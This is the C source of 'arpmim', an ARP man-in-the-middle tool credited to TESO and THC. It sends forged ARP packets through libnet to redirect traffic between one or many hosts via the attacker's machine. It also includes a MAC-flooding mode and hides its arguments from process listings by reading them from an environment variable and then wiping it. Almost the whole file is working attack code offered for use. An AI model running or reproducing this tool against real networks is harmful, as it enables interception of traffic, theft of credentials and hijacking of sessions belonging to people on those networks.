/*
 * ARP MITM attack tool. (c) x 2000
 * Idea from scut's arptool - Requires Libnet 1.00.
 * rewritten & enhanced by skyper/TESO.... 2001
 * Resurrected from the dead by Skyper/THC....2020
 *
 * Changes:
 *	s	: - rewritten
 *		  - macoff
 *		  - ip-list file input/output,
 * 			<ip1>[:<mac1>]
 *			<ip2>[:<mac2>]
 *			...
 *		  - asymmetric arpmim support (usefull for ssl/sshd mim)
 *		  - 1:N and n:N arpmim (experimental)
 *		  - ARP_REQUEST/REPLY (see informationals 001)
 *                  [UPDATE: same techniq works against obsd2.8
 *                  solaris 7+8, hpux10.20, hpux11.00, fbsd4.2, linux 2.2]
 * 
 * Features:
 * - classic mim: redirect data from 1 host to 1 host via your host.
 * - redirect data from n hosts to 1 host via your host with specific ip:mac.
 * - redirect data from N/all hosts to 1 host via your host with just 
 *   1 packet every 10 seconds. We use broadcast mac with unicast 
 *   arp-information in the packet.
 * - redirect communication from n hosts to n hosts via your host
 *   with just n packets (and _not_ n*n as most(all?) existing arpmim tools.
 * 
 * Hints:
 * - dont forgett to enable forwarding:
 *   "echo 1 >/proc/sys/net/ipv4/ip_forward"
 * - dont use NAT/connection tracking while hijaking.
 * - configure your firewall (input, output, forward rules)
 */

#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <unistd.h>
#include <signal.h>
#include <math.h>
#include <string.h>
#include <time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <libnet-1.0.h>

#define LINK_DEV	"eth0"
#define MAXBUFSIZE	1024
#define RECACHE_TIME	10
#define int_ntoa(x)	inet_ntoa(*((struct in_addr *)&(x)))
#define OPT_ASYM	0x01
#define OPT_FILE	0x02
#define OPT_REVASYM	0x04
#define OPT_MACOFF	0x08


#define ENV_ARGS                "ARGZ"

struct arp_mitm {
	unsigned char ether_src[6];
	unsigned char ether_dst[6];
	unsigned long s_addr;
	unsigned long d_addr;
};

struct _ipmac {
	unsigned char mac[6];
	unsigned long ip;
};

struct _opt {
	unsigned long int pwait;
	u_short arpop;
	struct _ipmac trgt;
	int verb;
	unsigned char mymac[6];
	unsigned char flags;
	char *ldev;
  	struct libnet_link_int *link;
	unsigned long int (*initipmac) (void *);
	unsigned long int (*getnextipmac) (void *);
	unsigned long int (*resetipmac) (void *);
} opt;

struct _avlopt {
	int pos;
	int len;
	char **argvlist;
} avl;

struct _fl {
	FILE *fd;
} fl;

/*
 * spread mode ip structure. all ip infos in HBO
 */
struct _srdnfo {
	unsigned long ip_offset;
	unsigned long ip_blklen;
	unsigned long ip_pos;
	unsigned long start_ip;
	unsigned long end_ip;
};

void parse_mac(char *, unsigned char *);
u_long gennext_spreadip(struct _srdnfo *);
int init_spreadset(struct _srdnfo *, u_long, u_long);
int str2ipmac(char *, struct _ipmac *);
void die(int, char *, ...);



static unsigned char *pkt;

int
dummy()
{
	return (0);
}

unsigned long int
init_argvlist(char *argv[])
{
	avl.argvlist = argv;
	avl.len = 0;
	avl.pos = 0;

	if (avl.argvlist == NULL)
		return (-1);

        while (avl.argvlist[avl.len] != NULL)
                avl.len++;

	return (0);
}

unsigned long int
getnext_argvlist(struct _ipmac *ipmac)
{
	if (avl.pos >= avl.len)
		return(-1);

	str2ipmac(avl.argvlist[avl.pos++], ipmac);
	return (0);
}

unsigned long int
reset_argvlist()
{
	if (opt.verb > 1)
		printf("restarting from the beginning.\n");

	avl.pos = 0;
	return (0);
}

unsigned long int
getnext_filelist(struct _ipmac *ipmac)
{
	char buf[128];

	if (fgets(buf, sizeof(buf)-1, fl.fd) == NULL)
		return (-1);

	str2ipmac(buf, ipmac);
	return (0);
}

unsigned long int
reset_filelist()
{
	if (opt.verb > 1)
		printf("reached eof. restarting filelist\n");

	return (fseek(fl.fd, 0L, SEEK_SET));
}

unsigned long int
getnext_random(struct _ipmac *ipmac)
{
	static char i = 0;

	if (i == 0)
	{
		srand((int)time(NULL));
		i = 1;
	}

	opt.trgt.ip = rand();
	ipmac->ip = rand();	/* we honestly dont care about the 	*/
				/* first 2 bytes of the mac....		*/
	memcpy(ipmac->mac+2, (char *)&(ipmac->ip), 4);
	memcpy(opt.trgt.mac+2, (char *)&(opt.trgt.ip), 4);
	memcpy(opt.mymac, ipmac->mac, 6);

	return (0);
}

void
init_vars()
{
	opt.pwait = 4000;
	opt.arpop = ARPOP_REPLY;
	opt.flags = 0;
	opt.verb = 0;
	opt.ldev = LINK_DEV;
	opt.initipmac = (void *) init_argvlist;
	opt.getnextipmac = (void *) getnext_argvlist;
	opt.resetipmac = (void *) reset_argvlist;
}


/*
 * this is for sure not reentrant.
 * returns mac-string from mac
 * NULL on error
 */
static char *
mac2str(unsigned char m[6])
{
	static char buf[32];

	sprintf(buf, "%2.2x:%2.2x:%2.2x:%2.2x:%2.2x:%2.2x", m[0], m[1], m[2],
							m[3], m[4], m[5]);
	return (buf);
}

/*
 * convert "<ip>:<mac> touple to ipmac struct
 * Set "ff:ff:ff:ff:ff:ff" if no mac is given.
 * return -1 on failure, 0 on success
 */
int
str2ipmac(char *str, struct _ipmac *ipmac)
{
	char *ptr;
	char str2[128];

	if (ipmac == NULL)
		return (-1);
	if (str == NULL)
		return (-1);

	strncpy(str2, str, sizeof(str2)-1);
	str2[sizeof(str2)-1] = '\0';
	if ((ptr = strchr(str2, ':')) != NULL)
	{
		*ptr++ = '\0';
		parse_mac(ptr, ipmac->mac);
	} else {
		memcpy(ipmac->mac, "\xff\xff\xff\xff\xff\xff", 6);
	}

	ipmac->ip = inet_addr(str2);
	
	return (0);
}

void 
usage(int code, char *string)
{
/*
	fprintf(stderr, "ERROR: %s\n", string);
	fprintf(stderr,
"\n"
"Usage:\n"
"arpmim [OPTION] <your mac> <targetip[:targetmac] <ip1[:mac1]> ...\n"
"[Tell ip1, ip2, ... ipN that targetip has <your mac> and\n"
" tell targetip that ip1, ip2, ... ipN has <your mac>]\n\n"
"Options:\n"
" -i <device>	: ethernet device [default=eth0]\n"
" -l <iprange>	: generate ip-list [73.50.0.0-73.50.31.255]\n"
" -f <file>	: read ip's[/:mac's] from file\n"
" -w <n ms>	: wait n ms between each packet [default=4sec]\n"
" -m		: macoff (macflood, elite switch -> lame hub)\n"
" -r		: use ARPOP_REQUEST [default=ARPOP_REPLY]\n"
" -a		: asymmetric\n"
" -A		: reverse asymmetric\n"
" -v		: verbose output [-vv..vv for more]\n"
"\nExamples:\n"
"Classic (1:1, gate=10.0.255.254, luser=10.0.119.119):\n"
"arpmim -v 00:02:13:37:73:50 10.0.255.254:11:11:22:22:33:33 \\\n"
"                            10.0.119.119:44:44:55:55:66:66\n"
"\n"
"Advanced (1:N, gate=10.0.255.254, asymmetric _only_):\n"
"arpmim -A -v 00:02:13:37:73:50 255.255.255.255 10.0.255.254\n"
"[tell everyone that 10.0.255.254 has 00:02:13:37:73:50]\n"
"\n"
"Elite (n:N):\n"
"arpmim -A -v 00:02:13:37:73:50 255.255.255.255 10.0.0.1 10.0.0.2 10.0.0.3 \\\n"
"                                               10.0.0.4 10.0.0.5 10.0.0.6\n"
"[tell 10.0.0.1,..10.0.0.6 that 10.0.0.1,..10.0.0.6 has 00:02:13:37:73:50]\n");
*/
	exit(code);
}

/*
 * write ip's to fd, one per line.
 * return 0 on success, -1 on error
 */
int
write_iprange(FILE *fd, char *str)
{
	u_long ip;
	char *ptr;
	struct _srdnfo srdnfo;
	char str2[128];

	strncpy(str2, str, sizeof(str2)-1);
	str2[sizeof(str2)-1] = '\0';

	if ((ptr = strchr(str2, '-')) == NULL)
		return (-1);

        *ptr++ = '\0';

	srdnfo.start_ip = ntohl(inet_addr(str2));
	srdnfo.end_ip = ntohl(inet_addr(ptr));
       	if (init_spreadset(&srdnfo, srdnfo.start_ip, srdnfo.end_ip) != 0)
		return (-1);

	while ((ip = gennext_spreadip(&srdnfo)) != -1)
		printf("%s\n", int_ntoa(ip));

	return (0);
}


void
do_opt(int argc, char *argv[])
{
	extern char *optarg;
	extern int optind;
	int c;

	while ((c = getopt (argc, argv, "w:i:l:f:mrAav")) != -1)
	{
		switch (c)
		{
		case 'r':
			opt.arpop = ARPOP_REQUEST;
			break;
		case 'w':
			opt.pwait = strtoul (optarg, NULL, 10);
			break;
		case 'i':
			opt.ldev = optarg;
			break;
		case 'l':
			if (write_iprange(stdout, optarg) != 0)
				die (EXIT_FAILURE, "iprage? %s", optarg);
			break;
		case 'A':
			opt.flags |= OPT_REVASYM;
			break;
		case 'a':
			opt.flags |= OPT_ASYM;
			break;
		case 'v':
			opt.verb++;
			break;
		case 'f':
			if ((fl.fd = fopen(optarg, "r")) == NULL)
				die (EXIT_FAILURE, "fopen %s", optarg);

			opt.initipmac = (void *) dummy;
			opt.getnextipmac = (void *) getnext_filelist;
			opt.resetipmac = (void *) reset_filelist;
			break;
		case 'm':
			opt.flags |= OPT_MACOFF;
			opt.initipmac = (void *) dummy;
			opt.getnextipmac = (void *) getnext_random;
			opt.resetipmac = (void *) dummy;
			break;
		case ':':
			usage(EXIT_FAILURE, "parameter missing");
			break;	/* this should never happen */
		default:
			usage(EXIT_FAILURE, "unknown option");
			break;
		}
	}

	if (opt.flags & OPT_MACOFF)
		return;

	if (argv[optind] != NULL)
		parse_mac(argv[optind++], opt.mymac);
	else
		die (EXIT_FAILURE, "you must specifiy your own mac.");

	if (argv[optind] != NULL)
		str2ipmac(argv[optind++], &opt.trgt);
	else
		die (EXIT_FAILURE, "no target given.");

	opt.initipmac(&argv[optind]);

}

void cleanup(int ret)
{
	fprintf(stderr, "exiting...\n");
	libnet_destroy_packet(&pkt);
	exit(ret);
}

void
die(int code, char *fmt, ...)
{
	va_list ap;
	char buf[512];
	
	va_start (ap, fmt);
	vsnprintf (buf, sizeof (buf) -1, fmt, ap);
	va_end (ap);
	fprintf(stderr, "ERROR: %s\n", buf);

	cleanup(code);
}
	
void banner( void )
{
	if (opt.verb > 5)
		printf("harharhar. PRETTY VERBOSE now you evil hacker!\n");
}

/*
 * get next ip in spread-mode
 * return NBO ip or -1 on error or when done
 */
u_long
gennext_spreadip(struct _srdnfo *srdnfo)
{
	u_long pos = srdnfo->ip_pos;

	if ((srdnfo->ip_offset + 1 >= srdnfo->ip_blklen)
		&& (srdnfo->ip_pos > srdnfo->end_ip))
		return (-1);

	if ((srdnfo->ip_pos + srdnfo->ip_blklen > srdnfo->end_ip)
		&& (srdnfo->ip_offset + 1 < srdnfo->ip_blklen))
		srdnfo->ip_pos = srdnfo->start_ip + (++srdnfo->ip_offset);
	else
		srdnfo->ip_pos += srdnfo->ip_blklen;

	return (htonl (pos));
}

/*
 * init spreadset, ip's in HBO
 * return 0 on success, -1 on error
 */
int
init_spreadset(struct _srdnfo *srdnfo, u_long start_ip, u_long end_ip)
{
	if (srdnfo == NULL)
		return (-1);

	if (start_ip >= end_ip)
		return (-1);

	srdnfo->start_ip = start_ip;
	srdnfo->ip_pos = srdnfo->start_ip;
	srdnfo->end_ip = end_ip;
	srdnfo->ip_blklen = (u_long) sqrt ((double)(end_ip - start_ip));
	if (srdnfo->ip_blklen > 100)	/* range is 100^2 in size */
		srdnfo->ip_blklen = 257 + srdnfo->ip_blklen * 0.2;

	srdnfo->ip_offset = 0;

	return (0);
}

void parse_mac(char *mac_string, unsigned char *mac)
{
  unsigned int tmp[6];
  int i;

	sscanf(mac_string, "%2x:%2x:%2x:%2x:%2x:%2x",
	       &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]);

	for(i = 0;i < 6;i++) mac[i] = tmp[i];
}


/*
 * tell 'dst' that I'M src
 * return 0 on success
 */
int
do_arpmim(char *mymac, struct _ipmac *src, struct _ipmac *dst)
{
	libnet_build_ethernet(dst->mac,
	                      mymac,
        	              ETHERTYPE_ARP, NULL, 0, pkt);

	libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP,
	                 6, 4, opt.arpop,
	                 mymac,
        	         (unsigned char *)&src->ip,
                	 dst->mac,
	                 (unsigned char *)&dst->ip, 
	                 NULL, 0, pkt + LIBNET_ETH_H);

	libnet_write_link_layer(opt.link, opt.ldev, pkt,
	                        LIBNET_ETH_H + LIBNET_ARP_H);
	return (0);

}
void
print_amitm(struct _ipmac *ipmac0, struct _ipmac *ipmac)
{
	if (opt.verb)
	{
		printf("Hi %s:%s, ", int_ntoa(ipmac->ip),
					mac2str(ipmac->mac));
		printf("%s is at %s\n", int_ntoa(ipmac0->ip),
					 mac2str(opt.mymac));
	}
}


void    reset_env (char *name)
{
        char *env = getenv (name);
        int len;

        if (env && (len = strlen (env)))
        {
                memset (env, 0, len);
        }

        return;
}


int     count_args_env (const char *args)
{
        int     i = 0;
        char    *token, *orig, *str;

        if (!args) return 0;

        orig = str = strdup (args);

        do
        {
                token = strsep (&str, " ");
                if (!*token) continue;
                i++;
        } while (str);

        free (orig);

        return i;
}


int     get_args_env (char *args, int *n_argc, char **n_argv[])
{
        int     i, num_args;
        char    *token, *orig, *str, **argv;

        if (!args) return -1;

        num_args = count_args_env (args);
        num_args++;

        if ((argv = malloc (sizeof (char *) * (num_args + 1))) == NULL)
        return -1;

        i = 0;
        argv[i++] = strdup (*n_argv[0]);

        orig = str = strdup (args);

        do
        {
                token = strsep (&str, " ");
                if (!*token) continue;
                argv[i] = strdup (token);
                i++;
        } while (str);

        free (orig);

        argv[i] = NULL;

        *n_argc = num_args;
        *n_argv = argv;

        return num_args;
}




int 
main(int argc, char *argv[])
{
  char error_buf[MAXBUFSIZE + 1];
  int i;
  unsigned short c = 0;
  struct _ipmac ipmac;
  char        *args;

	init_vars();

        if ((args = getenv (ENV_ARGS)))
        {
                get_args_env (args, &argc, &argv);
                reset_env (ENV_ARGS);
        }

	do_opt(argc, argv);
	if (opt.initipmac == NULL)
		usage(0, "not enough parameters");

	banner(); 

	if(libnet_init_packet(LIBNET_ETH_H + LIBNET_ARP_H, &pkt) == -1)
		die(EXIT_FAILURE, "libnet_init_packet failed.");

	if((opt.link = libnet_open_link_interface(opt.ldev, error_buf)) == NULL)
		die(EXIT_FAILURE, "libnet_open_link_interface failed: %s.",
			error_buf);

	signal(SIGINT, cleanup);
	signal(SIGKILL, cleanup);

	c = 0;
	i = 0;
	while (1)
	{

		if (opt.getnextipmac(&ipmac) == -1)
		{
			if (opt.resetipmac(NULL) != 0)
				die(EXIT_FAILURE, "unable to reset ipmac list");

			opt.getnextipmac(&ipmac);
		}

		if (!(opt.flags & OPT_REVASYM))
		{
			if (opt.verb)
				print_amitm(&opt.trgt, &ipmac);
			do_arpmim(opt.mymac, &opt.trgt, &ipmac);
		}

		if (!(opt.flags & OPT_ASYM))
		{
			usleep(3000); /* 0.03 seconds */
			if (opt.verb)
				print_amitm(&ipmac, &opt.trgt);
			do_arpmim(opt.mymac, &ipmac, &opt.trgt);
		}

		usleep(opt.pwait * 1000);
	}

	exit (EXIT_SUCCESS);
	return (EXIT_SUCCESS);
}

